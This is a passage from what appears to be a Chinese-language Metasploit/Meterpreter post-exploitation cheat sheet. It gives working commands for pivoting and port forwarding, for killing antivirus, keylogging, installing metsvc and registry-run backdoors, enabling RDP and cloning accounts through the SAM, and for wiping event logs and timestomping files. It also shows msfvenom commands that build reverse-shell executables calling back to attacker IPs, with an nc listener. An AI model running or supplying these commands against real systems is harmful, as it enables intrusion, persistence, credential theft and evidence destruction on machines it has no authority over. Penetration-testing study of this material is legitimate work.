```bash
run get_local_subnets                   # 获取网段
run autoroute -s 192.168.205.1/24       # 添加路由
run autoroute -p                        # 查看路由
run autoroute -d -s 172.2.175.0         # 删除网段
run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24   # 探测该网段下的存活主机.
meterpreter > background                # 后台 sessions
```
或者自动化
```bash
use post/multi/manage/autoroute
set session 1
exploit
```
**portfwd**
portfwd 是 meterpreter 提供的端口转发功能,在 meterpreter 下使用 portfwd -h 命令查看该命令参数.
```bash
portfwd add -l 2222 -r 1.1.1.1 -p 3389  # 将 1.1.1.1 的 3389 端口转发到本地的 2222 端口.
    -l:本地监听端口
    -r:内网目标的 ip
    -p:内网目标的端口
portfwd delete -l [port]
portfwd list
例如:
portfwd add -r 127.0.0.1 -p 3389 -l 1234
```
**pivot**
pivot 是 msf 最常用的代理,可以让我们使用 msf 提供的扫描模块对内网进行探测.
```bash
route add [ip] [mask] [session id]      # 添加一个路由
route print
```
如果其它程序需要访问这个内网环境,就可以建立 socks 代理
msf 提供了3个模块用来做 socks 代理.
```
auxiliary/server/socks4a
auxiliary/server/socks5
auxiliary/server/socks_unc
use auxiliary/server/socks4a
SRVHOST:监听的 ip 地址,默认为 0.0.0.0,一般不需要更改.
SRVPORT:监听的端口,默认为 1080.
```
直接运行 run 命令,就可以成功创建一个 socks4 代理隧道,在 linux 上可以配置 proxychains 使用,在 windows 可以配置 Proxifier 进行使用.
---
### 权限维持
**关闭防病毒软件**
```bash
run killav
```
一个技巧是注入到 service.exe/svchost.exe 或 高权限杀软中 干掉 其他杀软
**关闭进程**
```bash
pkill [进程名]
```
**键盘记录**
```bash
keyscan_start   # 开启键盘记录功能
keyscan_dump    # 显示捕捉到的键盘记录信息
keyscan_stop    # 停止键盘记录功能
```
**执行程序**
```bash
execute -f [path] [options] # 在目标主机上执行 exe 文件
-H : 创建一个隐藏进程
-a : 传递给命令的参数
-i : 跟进程进行交互
-m : 从内存中执行
-t : 使用当前伪造的线程令牌运行进程
-s : 在给定会话中执行进程
```
**进程迁移**
当 meterpreter 单独作为一个进程运行时容易被发现,如果将它和系统经常运行的进程进行绑定,就能够实现持久化.
```bash
getpid          # 查看当前会话的进程 id
ps              # 查看目标运行的进程
migrate [pid]   # 绑定/迁移进程
```
**后门**
MSF 自带两种植入后门的方式
Meterpreter 的 shell 运行在内存中,目标重启就会失效,如果管理员给系统打上补丁,那么就没办法再次使用 exploit 获取权限,所以需要持久的后门对目标进行控制
- **metsvc 服务后门**
    原理：命令运行成功后会在 `C:\Users\用户名\AppData\Local\Temp` 目录下新建随机名称的文件夹,里面生成3个文件(metsvc.dll、metsvc-server.exe、metsvc.exe)同时会新建一个服务,显示名称为 Meterpreter,服务名称为 metsvc,启动类型为"自动",绑定在 31337 端口.
    ```bash
    # 自动化安装
    run metsvc -A
    use exploit/multi/handler
    set payload windows/metsvc_bind_tcp
    set rhost [lhost]
    set lport 31337
    exploit -j
    ```
- **persistence 启动项后门**
    原理就是在 `C:\Users\用户名\AppData\Local\Temp` 下上传一个 VBS 脚本，通过该脚本，在注册表 `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\` 下新建一个开机启动项
    ```bash
    # 自动化部署
    run persistence -A
    run persistence -X -i 10 -r 192.168.1.9 -p 4444
    -A : 安装后门后,自动启动 exploit/multi/handler 模块连接后门
    -L : 自启动脚本的路径,默认为 %TEMP%
    -P : 需要使用的 payload,默认为 windows/meterpreter/reverse_tcp
    -S : 作为一个服务在系统启动时运行(需要 SYSTEM 权限)
    -T : 要使用的备用可执行模板
    -U : 用户登录时运行
    -X : 系统启动时运行
    -i : 后门每隔多少秒尝试连接服务端
    -p : 服务端监听的端口
    -r : 服务端 ip
    ```
    ```bash
    use exploit/multi/handle
    set payload windows/meterpreter/reverse_tcp
    set LHOST [lhost]
    set LPORT [lport]
    exploit -j
    ```
**RDP**
```bash
run post/windows/manage/enable_rdp  # 开启 3389 远程桌面;
run post/windows/manage/enable_rdp username=xxx password=xxx    # 添加远程桌面的用户(同时也会将该用户添加到管理员组)
```
**vnc**
```bash
run vnc                             # 分段注入VNC DLL
```
**注册表操作**
通过注册表设置开机自启动
```bash
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note -d 'C:\Windows\System32\notepad.exe'
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note
```
通过注册表复制克隆用户
```bash
reg enumkey -k HKLM\\sam\\sam\\domains\\account\\users
shell
net user guest /active:yes
reg copy HkLM\sam\sam\domains\account\users\000001f4 HkLM\sam\sam\domains\account\users\000001f5
```
---
### 痕迹清除
```bash
clearev     # 入侵痕迹擦除
```
**反电子取证**
```bash
timestomp -v secist.txt                     # 查看当前目标文件 MACE 时间.
timestomp -f c:\\AVScanner.ini secist.txt   # 将模板文件 MACE 时间,复制给当前文件
timestomp -v secist.txt
```
---
## stage 和 stageless 的区别
> 以下部分内容来自 [探寻Metasploit Payload模式背后的秘密](https://www.freebuf.com/articles/system/187312.html)
在 MSF 里有很相似的 metasploit payload,比如
```
payload/windows/x64/meterpreter/reverse_tcp  normal  No  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
payload/windows/x64/meterpreter_reverse_tcp  normal  No  Windows Meterpreter Shell, Reverse TCP Inline x64
```
这2者有什么关系呢?以 08067 模块的利用为例
**Stage**
- bootstrap(starger) : shellcode
- metserv : Meterpreter 核心文件
- stdapi : 计算机文件、系统、网络等属性的访问
- priv : 权限提升、转储密码 hash 和本地提权
当我们使用 metasplit 的 ms08_067_netapi 模块之后，使用 payload/windows/meterpreter/reverse_tcp 模块，并开启一个 multi/handler 连接监听着我们本机的 4444 端口，有了解过缓冲区溢出的同学可能都知道，攻击者会利用软件的某个缺陷来传输一段很长的 shellcode 来溢出目标的缓冲区，从而控制 EIP 指针来跳转到我们的 shellcode 上，执行我们的代码，但是这段 shellcode 并不能过长，shellcode 过长，可能会导致覆盖到了上一函数栈帧的数据，导致异常的发生。所以像我们攻击者最希望就是生成一段短小精悍的 shellcode
像下面这张图，我们攻击机像目标靶机发送了一段 shellcode，并覆盖了 EIP，导致程序执行的时候跳回 shellcode 的开头，从而控制程序的执行情况，执行我们的恶意代码，这段恶意代码就只要干两件事，第一件事就是向内存申请开辟一块空间，第二件事就是回连我们的 4444 端口，这段 shellcode 为我们干的事情就好像是一个前排冲锋的战士，打开城墙的大门好让更多的精兵冲进来。我们称这段 shellcode 为 stage0，也就是第一阶段
这时，我们的攻击机，已经开始监听 4444 端口了，只要连接一成功，就会把 meterpreter shell 最核心的 dll 文件发送到靶机上
我们之前说过，当靶机运行了我们的 shellcode，会在内存里面开辟一块土地，这个地方就是为我们的 metsrv 留的，metsrv.dll 这个文件是 meterpreter 的核心组件，有了他，我们才能获取到一个 meterpreter shell，当 metsrv 传输成功之后，shellcode 就会把控制权转给 metsrv，metsrv 这时再去请求另外两个 dll 文件 stdapi 和 priv。这个时候目标就上线了.
**Stageless**
现在我们知道了 meterpreter/reverse_tcp 是分阶段的 shellcode，并且他分阶段的原因是因为在溢出攻击的时候 shellcode 应该尽可能保持得更短，这个时候理解他小兄弟 meterpreter_reverse_tcp 就方便的多，和 meterpreter/reverse_tcp 不同的是，他的小兄弟 meterpreter_reverse_tcp 是一个不分阶段的 payload，我们称之为 stageless(unstage)，他在生成的时候就已经将我们获取一个 meterpreter 必须要用的 stdapi 已经包含在其中了。那这又有什么好处呢？试想一下，如果我们通过层层的代理，在内网进行漫游，这个时候使用分阶段的 payload 如果网络传输出现了问题，metsrv.dll 没有加载过去，可能就会错失一个 shell，stageless 的 payload 会让人放心不少
默认的 stageless payload 只会包含 stageless，所以如果想将 stdapi 和 priv 两个组件给包含进去的话我们可以用 extensions 命令：
```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 EXTENSIONS=stdapi,priv -f exe -o stageless.exe
```
**回弹至 nc**
分阶段的 payload，我们必须使用 exploit/multi/handler 这个模块使用，但是当我们想回弹一个基础的 shell 的时候，其实可以使用 nc 来监听端口直接回连到 nc 上
当有时获取到了 root 权限，想反弹 linux shell 的时候，这时 meterprter 的需求就不是那么高了，我们就可以使用 shell_reverse_tcp(或者是 bind) 来生成一个 stageless 的 bash 脚本，直接使用 nc 来接受 shell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.141.143 LPORT=4444 -f exe > ./vu.exe
```
nc 监听
```bash
nc -tvlp 4444
```
接收回弹